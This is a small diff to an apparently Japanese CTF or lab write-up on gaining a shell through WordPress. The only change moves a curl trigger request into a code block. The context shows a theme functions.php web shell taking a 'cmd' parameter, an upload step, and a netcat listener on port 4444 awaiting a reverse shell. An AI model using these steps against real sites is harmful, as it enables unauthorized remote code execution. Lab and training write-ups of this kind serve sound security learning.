@@ -29,7 +29,11 @@ http://alvida-eatery.org/wp-content/themes/twentytwentytwo/functions.php?cmd=who
 　 `->  upload`
 3. 攻撃者端末
 - `nc -nlvp 4444`
-- `curl http://vtcsec/secret/wp-content/themes/twentyseventeen/404.php`  
+
+```zsh
+curl http://vtcsec/secret/wp-content/themes/twentyseventeen/404.php
+```
+
 ---
 # Pluginを利用
 - WordPressの管理者アカウントが必要
